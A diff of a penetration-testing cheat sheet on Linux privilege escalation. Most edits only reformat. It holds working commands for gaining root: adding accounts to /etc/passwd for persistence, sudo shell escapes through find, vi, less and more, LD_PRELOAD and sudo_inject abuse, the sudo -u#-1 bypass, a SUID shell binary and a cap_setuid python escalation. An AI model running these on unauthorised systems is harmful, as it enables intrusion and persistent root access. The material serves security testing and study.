@@ -19,9 +19,13 @@ TODO: Add contents links at the top of each page, and references section at the 
 
 ### Add Account & Password to /etc/passwd
 
-Generate password with `openssl passwd -1 -salt <username> <password>` , then add to `/etc/passwd` file which is in the format: `Username:generated-password:UID:GUID:root:/root:/bin/bash` \(assumes you have write privilege to this file!\). Can be used for persistence.
+* Generate password with `openssl passwd -1 -salt $username $password` 
+* Add to `/etc/passwd` file which is in the format: 
+  * `$UserName:$generated_password:$UID:$GUID:$comment:$home_dir:$default_shell` 
+  * \(assumes you have write privilege to this file!\). 
+* Can be used for persistence.
 
-Create SHA512 password for import into passwd file:
+#### Create SHA512 password hash for import into passwd file:
 
 ```python
 python -c "import crypt, getpass, pwd; \
@@ -36,7 +40,11 @@ python -c 'import crypt; \
              print(crypt.crypt("somesecret", crypt.mksalt(crypt.METHOD_SHA512)))'
 ```
 
-Create SHA1 password: `sha1pass mypassword`
+#### Create SHA1 password hash: 
+
+```bash
+sha1pass $mypassword
+```
 
 ## GTFOBins
 
@@ -50,30 +58,41 @@ You can also find a similar project for Windows at [LOLBAS](https://lolbas-proje
 
 #### Examples:
 
-Privilege Escalation to Root with `find`: `sudo find /etc -exec sh -i \;`
+Privilege Escalation to Root with `find`: 
 
-Execute any command while in `less`: `!<cmd>`
+```bash
+sudo find /etc -exec sh -i \;
+```
+
+Execute any command while in `less`: 
+
+```bash
+!$command
+```
 
 Escalate to root shell if your user can `sudo` any of these text editors:
 
 ```bash
+#vi
 1. [user@localhost]$ sudo vi
 2. :shell
 3. [root@localhost]#
--or-
+#-or-
 sudo vim -c '!sh'
--or
+#-or
 sudo -u root vim -c '!sh'
 
+#less
 1. [user@localhost]$ sudo less file.txt
 2. !bash
 3. [root@localhost]#
 
+#more
 1. [user@localhost]$ sudo more long_file.txt
 2. !bash
 3. [root@localhost]#
-Note: for the 'more' method to work, the attacker has to read a file 
-that is longer than one terminal screen high
+#Note: for the 'more' method to work, the attacker has to read a file 
+#that is longer than one terminal screen high
 ```
 
 ## Sudo
@@ -125,22 +144,12 @@ void _init() {
 
   3. Execute any binary along with the LD\_PRELOAD shared object to spawn a shell : `sudo LD_PRELOAD=</path/to/malicious/shell.so> <program>`
 
-### doas \(OpenBSD\)
-
-There are some alternatives to `sudo` such as `doas` for OpenBSD. You can check its configuration in `/etc/doas.conf`.  This configuration has a different syntax than `/etc/sudoers`. 
-
-```bash
-#this is the same as the /etc/sudoers example with NOPASSWD
-permit nopass zweilos as root cmd vim
-
-```
-
 ### sudo\_inject
 
 Using [https://github.com/nongiach/sudo\_inject](https://github.com/nongiach/sudo_inject):
 
 ```bash
-$ sudo <program>
+$ sudo $command
 [sudo] password for user:    
 # Press Ctrl+c since you don't have the password, which creates an invalid sudo token
 $ sh exploit.sh
@@ -167,6 +176,15 @@ sudo -u#-1 id
 0
 sudo -u#4294967295 id
 0
+```
+
+## doas \(OpenBSD\)
+
+There are some alternatives to `sudo` such as `doas` for OpenBSD. You can check its configuration in `/etc/doas.conf`.  This configuration has a different syntax than `/etc/sudoers`. 
+
+```bash
+#this is the same as the /etc/sudoers example with NOPASSWD
+permit nopass zweilos as root cmd vim
 ```
 
 ## SSH
@@ -233,8 +251,8 @@ gcc -o /tmp/suid /tmp/suid.c
 sudo chmod +x /tmp/suid # add execute permission
 sudo chmod +s /tmp/suid # add suid permission
 
-Executing this program will give the user a root shell.  
-Note that sudo rights are required to accomplish this.
+#Executing this program will give the user a root shell.  
+#Note that sudo rights are required to accomplish this.
 ```
 
 ## File Capabilities
@@ -245,7 +263,15 @@ BLUF: Capabilities break up root privileges in smaller units, so root access is 
 
 TODO: rewrite this for clarity and brevity
 
-> Normally the root user \(or any ID with UID of 0\) gets a special treatment when running processes. The kernel and applications are usually programmed to skip the restriction of some activities when seeing this user ID. In other words, this user is allowed to do \(almost\) anything. Linux capabilities provide a subset of the available root privileges to a process. This effectively breaks up root privileges into smaller and distinctive units. Each of these units can then be independently be granted to processes. This way the full set of privileges is reduced and decreasing the risks of exploitation. Why capabilities? To better understand how Linux capabilities work, let’s have a look first at the problem it tries to solve. Let’s assume we are running a process as a normal user. This means we are non-privileged. We can only access data that owned by us, our group, or which is marked for access by all users. At some point in time, our process needs a little bit more permissions to fulfill its duties, like opening a network socket. The problem is that normal users can not open a socket, as this requires root permissions. Option 1: Giving everyone root permissions One of the solutions is to allow some permissions \(by default\) to all users. There is a serious flaw in this approach. Allowing this kind of permissions, for all users, would open up the system for a flood of system abuse. The reason is that every small opportunity is being used for good, but also for bad. Giving away too many privileges by default will result in unauthorized changes of data, backdoors and circumventing access controls, just to name a few. Option 2: Using a fine-grained set of privileges For example, a web server normally runs at port 80. To start listening on one of the lower ports \(&lt;1024\), you need root permissions. This web server daemon needs to be able to listen to port 80. However, it does not need access to kernel modules as that would be a serious threat to the integrity of the system!. Instead of giving this daemon all root permissions, we can set a capability on the related binary, like CAP\_NET\_BIND\_SERVICE. With this specific capability, it can open up port 80. Much better! Replacing setuid with capabilities Assigning the setuid bit to binaries is a common way to give programs root permissions. Linux capabilities is a great alternative to reduce the usage of setuid.
+> Normally the root user \(or any ID with UID of 0\) gets a special treatment when running processes. The kernel and applications are usually programmed to skip the restriction of some activities when seeing this user ID. In other words, this user is allowed to do \(almost\) anything. Linux capabilities provide a subset of the available root privileges to a process. This effectively breaks up root privileges into smaller and distinctive units. Each of these units can then be independently be granted to processes. This way the full set of privileges is reduced and decreasing the risks of exploitation. 
+>
+> Why capabilities? To better understand how Linux capabilities work, let’s have a look first at the problem it tries to solve. Let’s assume we are running a process as a normal user. This means we are non-privileged. We can only access data that owned by us, our group, or which is marked for access by all users. At some point in time, our process needs a little bit more permissions to fulfill its duties, like opening a network socket. The problem is that normal users can not open a socket, as this requires root permissions. 
+>
+> Option 1: Giving everyone root permissions One of the solutions is to allow some permissions \(by default\) to all users. There is a serious flaw in this approach. Allowing this kind of permissions, for all users, would open up the system for a flood of system abuse. The reason is that every small opportunity is being used for good, but also for bad. Giving away too many privileges by default will result in unauthorized changes of data, backdoors and circumventing access controls, just to name a few. 
+>
+> Option 2: Using a fine-grained set of privileges For example, a web server normally runs at port 80. To start listening on one of the lower ports \(&lt;1024\), you need root permissions. This web server daemon needs to be able to listen to port 80. However, it does not need access to kernel modules as that would be a serious threat to the integrity of the system!. Instead of giving this daemon all root permissions, we can set a capability on the related binary, like CAP\_NET\_BIND\_SERVICE. With this specific capability, it can open up port 80. Much better! 
+>
+> Replacing setuid with capabilities Assigning the setuid bit to binaries is a common way to give programs root permissions. Linux capabilities is a great alternative to reduce the usage of setuid.
 
 | Capabilities name | Description |
 | :--- | :--- |
@@ -306,11 +332,10 @@ SUID: `cap_setuid+ep`
 Example of privilege escalation with `cap_setuid+ep`
 
 ```bash
-$ sudo /usr/bin/setcap cap_setuid+ep /usr/bin/python2.7
-
-$ python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
-sh-5.0# id
-uid=0(root) gid=1000(zweilos)
+sudo /usr/bin/setcap cap_setuid+ep /usr/bin/python2.7
+python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+id
+#uid=0(root) gid=1000(zweilos)
 ```
 
 ## Misc
